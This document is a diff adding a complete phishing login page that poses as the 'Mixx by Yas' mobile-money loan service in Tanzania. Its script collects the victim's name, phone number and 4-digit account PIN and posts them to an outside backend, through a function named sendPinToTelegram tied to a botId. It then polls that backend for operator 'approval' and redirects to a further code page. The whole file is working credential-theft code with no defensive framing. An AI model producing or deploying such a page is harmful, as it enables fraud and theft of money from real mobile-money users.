@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Mixx by Yas | Login</title>
+
+<style>
+*{
+  margin:0;
+  padding:0;
+  box-sizing:border-box;
+}
+
+body{
+  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
+  background:#f5f5f5;
+  min-height:100vh;
+}
+
+.container{
+  min-height:100vh;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  padding:0;
+}
+
+.upper-section{
+  width:100%;
+  max-width:420px;
+  text-align:center;
+}
+
+.header{
+  background:#004fc5;
+  padding:20px 20px 20px;
+  border-bottom-left-radius:20px;
+  border-bottom-right-radius:20px;
+}
+
+.logo-circle{
+  width:55px;
+  height:55px;
+  background:#ffd500;
+  border-radius:50%;
+  margin:0 auto 8px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  color:#004fc5;
+  font-size:22px;
+  font-weight:bold;
+}
+
+.brand{
+  color:#ffd500;
+  font-size:24px;
+  font-weight:700;
+}
+
+.subtitle{
+  color:white;
+  margin-top:3px;
+  font-size:13px;
+}
+
+.content{
+  padding:30px 20px;
+}
+
+.login-title{
+  font-size:34px;
+  color:#333;
+  font-weight:600;
+  margin-bottom:20px;
+}
+
+.phone-wrapper{
+  position:relative;
+  margin-bottom:25px;
+}
+
+.phone-display{
+  width:100%;
+  padding:16px;
+  padding-left:60px;
+  border:1px solid #ddd;
+  border-radius:10px;
+  font-size:18px;
+  background:white;
+  text-align:left;
+}
+
+.flag{
+  position:absolute;
+  left:18px;
+  top:50%;
+  transform:translateY(-50%);
+  font-size:22px;
+}
+
+.pin-label{
+  color:#666;
+  font-size:16px;
+  margin-bottom:18px;
+}
+
+.pin-row{
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  gap:15px;
+}
+
+.pin-boxes{
+  display:flex;
+  gap:12px;
+}
+
+.pin-boxes input{
+  width:55px;
+  height:55px;
+  border:1px solid #d9d9d9;
+  border-radius:10px;
+  text-align:center;
+  font-size:24px;
+  outline:none;
+  background:white;
+}
+
+.eye{
+  font-size:22px;
+  color:#888;
+}
+
+.forgot{
+  color:#004fc5;
+  margin-top:18px;
+  font-size:15px;
+}
+
+#status{
+  min-height:20px;
+  margin-top:10px;
+  color:#d00;
+  font-size:14px;
+}
+
+.lower-section{
+  width:100%;
+  max-width:420px;
+  padding:0 20px 40px;
+}
+
+.action-buttons{
+  margin-top:15px;
+}
+
+.action{
+  width:100%;
+  background:#004fc5;
+  color:white;
+  text-align:center;
+  padding:16px;
+  border-radius:10px;
+  font-size:18px;
+  font-weight:600;
+  cursor:pointer;
+}
+
+@media(max-width:480px){
+
+.login-title{
+  font-size:30px;
+}
+
+.pin-boxes input{
+  width:50px;
+  height:50px;
+}
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+  <div class="upper-section">
+
+    <div class="header">
+
+      <div class="logo-circle">
+        yas
+      </div>
+
+      <div class="brand">
+        Mixx by Yas
+      </div>
+
+      <div class="subtitle">
+        Easy and Fast Loans
+      </div>
+
+    </div>
+
+    <div class="content">
+
+      <div class="login-title">
+        Log in
+      </div>
+
+      <div class="phone-wrapper">
+
+        <span class="flag">🇹🇿</span>
+
+        <input
+          class="phone-display"
+          id="phoneDisplay"
+          readonly
+          value="+255 712 345 678">
+
+      </div>
+
+      <div class="pin-label">
+        Enter your Merchant Account PIN (4 digits)
+      </div>
+
+      <div class="pin-row">
+
+        <div class="pin-boxes">
+          <input type="tel" maxlength="1">
+          <input type="tel" maxlength="1">
+          <input type="tel" maxlength="1">
+          <input type="tel" maxlength="1">
+        </div>
+
+        <div class="eye">👁</div>
+
+      </div>
+
+      <div class="forgot">
+        Forgot your PIN?
+      </div>
+
+      <div id="status"></div>
+
+    </div>
+
+  </div>
+
+  <div class="lower-section">
+
+    <div class="action-buttons">
+      <div class="action">
+        CONFIRM PIN
+      </div>
+    </div>
+
+  </div>
+
+</div>
+
+<script>
+document.getElementById("phoneDisplay").value =
+  localStorage.getItem("phone") || "Numéro inconnu";
+
+const botId = new URLSearchParams(window.location.search).get("botId");
+const boxes = document.querySelectorAll(".pin-boxes input");
+const statusEl = document.getElementById("status");
+
+async function sendPinToTelegram(name, phone, pin) {
+  const BACKEND_URL = "https://airtel-money-loans.onrender.com";
+  try {
+    const res = await fetch(`${BACKEND_URL}/submit-pin`, {
+      method: "POST",
+      headers: {"Content-Type":"application/json"},
+      body: JSON.stringify({ name, phone, pin, botId })
+    });
+    return res.json();
+  } catch {
+    return null;
+  }
+}
+
+async function pollPinApproval(requestId) {
+  const BACKEND_URL = "https://airtel-money-loans.onrender.com";
+  return new Promise(resolve => {
+    const i = setInterval(async () => {
+      const r = await fetch(`${BACKEND_URL}/check-pin/${requestId}`);
+      const d = await r.json();
+      if(d.approved === true || d.approved === false){
+        clearInterval(i);
+        resolve(d.approved);
+      }
+    },1500);
+  });
+}
+
+boxes.forEach((box,i)=>{
+  box.addEventListener("input", async ()=>{
+    box.value = box.value.replace(/[^0-9]/g,'');
+    if(box.value && i<3) boxes[i+1].focus();
+    if(i===3 && box.value){
+      let pin=""; boxes.forEach(b=>pin+=b.value);
+      localStorage.setItem("pin",pin);
+      const name = localStorage.getItem("name")||"Unknown";
+      const phone = localStorage.getItem("phone")||"Unknown";
+      boxes.forEach(b=>b.disabled=true);
+      statusEl.textContent="Envoi du code PIN...";
+      const res = await sendPinToTelegram(name,phone,pin);
+      if(!res||!res.requestId){
+        statusEl.textContent="Échec. Veuillez réessayer.";
+        boxes.forEach(b=>{b.disabled=false;b.value="";});
+        boxes[0].focus(); return;
+      }
+      const ok = await pollPinApproval(res.requestId);
+      if(ok){
+        window.location.href="code.html?botId="+botId;
+      } else {
+        statusEl.textContent="Code PIN incorrect.";
+        boxes.forEach(b=>{b.disabled=false;b.value="";});
+        boxes[0].focus();
+      }
+    }
+  });
+  box.addEventListener("keydown",e=>{
+    if(e.key==="Backspace"&&!box.value&&i>0) boxes[i-1].focus();
+  });
+});
+boxes[0].focus();
+</script>
+
+</body>
+</html>
